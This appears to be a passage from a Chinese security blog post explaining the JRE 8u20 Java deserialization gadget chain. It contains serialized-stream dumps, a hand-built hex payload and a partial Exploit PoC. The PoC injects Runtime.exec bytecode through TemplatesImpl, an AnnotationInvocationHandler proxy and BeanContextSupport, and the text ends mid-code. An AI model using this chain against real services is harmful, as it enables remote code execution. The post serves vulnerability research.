class="line">&#125;</span><br></pre></td></tr></table></figure><p>B的特点就是<strong>在本身的readObject里面又调用了下一个流中对象的readObject</strong></p><p>梳理一下，我们现在需要的是==把A序列化好的hex插入到B中==</p><p>这样B在反序列化的时候：</p><ul><li><code>input.defaultReadObject();</code> 反序列化出来的是B自身对象</li><li><code>input.readObject</code>反序列化出来的就是A的对象，会报错，但是会被B catch 住，==不影响反序列化对象在内存中的存在==</li></ul><p>所以A的序列化文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">49</span> - <span class="number">0x00</span> <span class="number">31</span></span><br><span class="line">        Value - com.fxc.bautwentycase.AnnotationInvocationHandler - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a</span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">      Fields</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Int - I - <span class="number">0x49</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - zero - <span class="number">0x7a65726f</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.bautwentycase.AnnotationInvocationHandler</span><br><span class="line">        values</span><br><span class="line">          zero</span><br><span class="line">            (<span class="keyword">int</span>)<span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>B的序列化文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">40</span> - <span class="number">0x00</span> <span class="number">28</span></span><br><span class="line">        Value - com.fxc.bautwentycase.BeanContextSupport - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e4265616e436f6e74657874537570706f7274</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.bautwentycase.BeanContextSupport</span><br><span class="line">        values</span><br></pre></td></tr></table></figure><p>再重复一遍：==A插入到B中==</p><p>插入到哪里？自然是<code>objectAnnotation</code>中了</p><p>前面我省略了，重点看插入后的<code>classdata</code>部分，最终版</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">40</span> - <span class="number">0x00</span> <span class="number">28</span></span><br><span class="line">        Value - com.fxc.bautwentycase.BeanContextSupport - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e4265616e436f6e74657874537570706f7274</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span> <span class="comment">//类对象</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE <span class="comment">//修改</span></span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span> <span class="comment">// 实际对象</span></span><br><span class="line">    classdata</span><br><span class="line">      com.panda.sec.BeanContextSupport</span><br><span class="line">        values</span><br><span class="line">    objectAnnotation       <span class="comment">//     从这里开始</span></span><br><span class="line">      TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">        TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">          className</span><br><span class="line">            Length - <span class="number">49</span> - <span class="number">0x00</span> <span class="number">31</span></span><br><span class="line">            Value - com.fxc.bautwentycase.AnnotationInvocationHandler - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572</span></span><br><span class="line">          serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a</span><br><span class="line">          newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">02</span>   <span class="comment">// 记得按顺序修改</span></span><br><span class="line">          classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">          fieldCount - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">          Fields</span><br><span class="line">            <span class="number">0</span>:</span><br><span class="line">              Int - I - <span class="number">0x49</span></span><br><span class="line">              fieldName</span><br><span class="line">                Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">                Value - zero - <span class="number">0x7a65726f</span></span><br><span class="line">          classAnnotations</span><br><span class="line">            TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">          superClassDesc</span><br><span class="line">            TC_NULL - <span class="number">0x70</span></span><br><span class="line">        newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">        classdata</span><br><span class="line">          com.fxc.bautwentycase.AnnotationInvocationHandler</span><br><span class="line">            values</span><br><span class="line">              zero</span><br><span class="line">                (<span class="keyword">int</span>)<span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span> <span class="comment">// 标志着对象结束</span></span><br><span class="line">  TC_REFERENCE - <span class="number">0x71</span></span><br><span class="line">    Handle - <span class="number">8257539</span> - <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">03</span> <span class="comment">//记得加最后一个句柄</span></span><br></pre></td></tr></table></figure><p><code>8257539</code>怎么来的？</p><p>当然是逆<code>SerializationDumper</code>看源码抄的\doge：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">num</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> b1 = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">byte</span> b2 = <span class="number">126</span>;</span><br><span class="line">        <span class="keyword">byte</span> b3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">byte</span> b4 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> handle = (</span><br><span class="line">                ((b1 &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xff000000</span>) +</span><br><span class="line">                        ((b2 &lt;&lt; <span class="number">16</span>) &amp;   <span class="number">0xff0000</span>) +</span><br><span class="line">                        ((b3 &lt;&lt;  <span class="number">8</span>) &amp;     <span class="number">0xff00</span>) +</span><br><span class="line">                        ((b4      ) &amp;       <span class="number">0xff</span>)</span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">"Handle - "</span> + handle + <span class="string">" - 0x"</span> + byteToHex(b1) + <span class="string">" "</span> + byteToHex(b2) + <span class="string">" "</span> + byteToHex(b3) + <span class="string">" "</span> + byteToHex(b4));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们的payload梳理一下就是这个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aced <span class="number">0005</span> <span class="number">7372</span> <span class="number">0028</span> <span class="number">636f</span> <span class="number">6</span>d2e <span class="number">6678</span> <span class="number">632</span>e</span><br><span class="line"><span class="number">6261</span> <span class="number">7574</span> <span class="number">7765</span> <span class="number">6e74</span> <span class="number">7963</span> <span class="number">6173</span> <span class="number">652</span>e <span class="number">4265</span></span><br><span class="line"><span class="number">616</span>e <span class="number">436f</span> <span class="number">6e74</span> <span class="number">6578</span> <span class="number">7453</span> <span class="number">7570</span> <span class="number">706f</span> <span class="number">7274</span></span><br><span class="line"><span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0014</span> <span class="number">0300</span> <span class="number">0078</span> <span class="number">7073</span> <span class="number">7200</span></span><br><span class="line"><span class="number">3163</span> <span class="number">6f</span>6d <span class="number">2e66</span> <span class="number">7863</span> <span class="number">2e62</span> <span class="number">6175</span> <span class="number">7477</span> <span class="number">656</span>e</span><br><span class="line"><span class="number">7479</span> <span class="number">6361</span> <span class="number">7365</span> <span class="number">2e41</span> <span class="number">6e6</span>e <span class="number">6f</span>74 <span class="number">6174</span> <span class="number">696f</span></span><br><span class="line"><span class="number">6e49</span> <span class="number">6e76</span> <span class="number">6f</span>63 <span class="number">6174</span> <span class="number">696f</span> <span class="number">6e48</span> <span class="number">616</span>e <span class="number">646</span>c</span><br><span class="line"><span class="number">6572</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">000</span>a <span class="number">0200</span> <span class="number">0149</span> <span class="number">0004</span></span><br><span class="line"><span class="number">7</span>a65 <span class="number">726f</span> <span class="number">7870</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">7871</span> <span class="number">007</span>e <span class="number">0003</span></span><br></pre></td></tr></table></figure><p>攻击一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Attack</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload"</span>));</span><br><span class="line">        <span class="comment">// 第一层</span></span><br><span class="line">        System.out.println(ois.readObject().toString());</span><br><span class="line">        AnnotationInvocationHandler a = (AnnotationInvocationHandler) ois.readObject();</span><br><span class="line">        <span class="comment">// 第二层</span></span><br><span class="line">        System.out.println(a.toString());</span><br><span class="line">        a.exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210717183158101.png" alt="image-20210717183158101" style="zoom:50%;"><p>并且可以发现：[B(A)]</p><p>我们把A塞进了B之中，所以第一个反序列化出来的是B对象，第二个反序列化出来的是A对象。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>经过<a href="https://xz.aliyun.com/t/7240#toc-3" target="_blank" rel="noopener">这篇</a>的分析:</p><blockquote><p>当我们序列化一个对象的时候，每次在写入序列化对象的时候，都会调用<code>handles.lookup</code>方法来判断该对象是否已经写入了，如果已经写入了，那么就会调用<code>writeHandle(h)</code>来写入引用类型标识和handle引用值<code>0x7e0000+handle</code></p></blockquote><p>在之前的7u21中</p><p>序列化顺序：HashSet.writeObject -&gt; AnnotationInvocationHandler.defaultWriteFields</p><p>反序列化顺序：HashSet.readObject -&gt; AnnotationInvocationHandler.readObject</p><p>但是在8u20中，AnnotationInvocationHandler.readObject限制了this.type必须是注解类型才可以。</p><p>如果不是的话，会抛出异常。</p><p>这个异常如果在反序列化过程当中被抛出，外层的HashSet也并没有catch处理，所以会报错。</p><p>所以我们需要找到一个类，除了最基本的序列化条件，还需要满足：</p><ul><li>重写了readObject方法</li><li>在自身的readObject方法中，还存在readObject方法的调用，并且对第二次的readObject方法存在异常的catch。</li></ul><p>JRE8u20 中利用到了名为 BeanContextSupport 类。</p><p>这个类满足以上条件，负责来帮我们绕过的。</p><p>看一下BeanContextSupport的readObject源码：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194016263.png" alt="image-20210521194016263" style="zoom: 85%;"><p>进入readChildren方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194127997.png" alt="image-20210521194127997" style="zoom:85%;"><p>发现这里读去了流中的下一个对象，并且出现异常仅仅是catch，<strong>并没有throw</strong>，符合构造条件。</p><p><strong>在执行<code>ois.readObject()</code>时,这里try-catch了,但是没有把异常抛出来,程序会接着执行。</strong></p><p>如果这里可以把<code>AnnotationInvocationHandler</code>对象在<code>BeanContextSupport</code>类第二次writeObject的时候写入，这样反序列化时，即使<code>AnnotationInvocationHandler</code>对象 this.type的值为<code>Templates</code>类型也不会报错。</p><blockquote><p>反序列化还有两点就是:</p><p>1.反序列化时类中没有这个成员，依然会对这个成员进行反序列化操作，但是之后会抛弃掉这个成员。</p><p>2.每一个新的对象都会分配一个newHandle的值，newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用<code>TC_REFERENCE</code>结构，引用前面handle的值。</p></blockquote><p>在之前的<a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/" target="_blank" rel="noopener">反序列化流程</a>分析中我们知道：</p><blockquote><p>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，<strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。</strong></p></blockquote><h3 id="关联"><a href="#关联" class="headerlink" title="关联"></a>关联</h3><p>我们在7u21里面用的是LinkedHashSet作为反序列化的source类，我们现在希望有一个可以触发BeanContextSupport的readObject方法。</p><p>所以可以<strong>在LinkedHashSet内部生成一个BeanContextSupport类型的字段</strong>，这样就可以和7u21一样触发字段readObject方法了。</p><p>因为在反序列化流程中，都是先还原对象中字段的值，然后才是objectAnnotation的内容。所以放在这个场景里就是：</p><ol><li><p>还原一个LinkedHashSet</p></li><li><p>还原这个LinkedHashSet中字段的值 </p></li><li><p>如果这个LinkedHashSet中某一个字段是BeanContextSupport类型，那么就会触发BeanContextSupport.readObject</p></li><li><p>这个BeanContextSupport类型的字段本身还有一个字段是AnnotationInvocationHandler类型，所以就又会去触发AnnotationInvocationHandler.readObject</p></li></ol><p>构造可以参考<a href="https://xz.aliyun.com/t/8277#toc-5" target="_blank" rel="noopener">feihong</a>师傅的payload，膜了膜了。</p><h2 id="最终PoC-1"><a href="#最终PoC-1" class="headerlink" title="最终PoC"></a>最终PoC</h2><p>最终payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//_auxClasses为空</span></span><br><span class="line">        Field _auxClasses = TemplatesImpl.class.getDeclaredField("_auxClasses");</span><br><span class="line">        _auxClasses.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _auxClasses.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//_auxClasses为空</span></span><br><span class="line">        Field _tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");</span><br><span class="line">        _tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _tfactory.set(tmpl, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//整个map,容量为2</span></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap(<span class="number">2</span>);</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="comment">// 占位</span></span><br><span class="line">        map.put(magicStr, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Field type = clazz.getDeclaredField(<span class="string">"type"</span>);</span><br><span class="line">        type.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        type.set(invocationHandler,Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//替换为真正的</span></span><br><span class="line">        map.put(magicStr, tmpl);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将serializable属性修改为0 为了进入readChildren方法</span></span><br><span class="line">        BeanContextSupport bcs = <span class="keyword">new</span> BeanContextSupport();</span><br><span class="line">        Class cc = Class.forName(<span class="string">"java.beans.beancontext.BeanContextSupport"</span>);</span><br><span class="line">        Field serializable = cc.getDeclaredField(<span class="string">"serializable"</span>);</span><br><span class="line">        serializable.setAccessible(<span 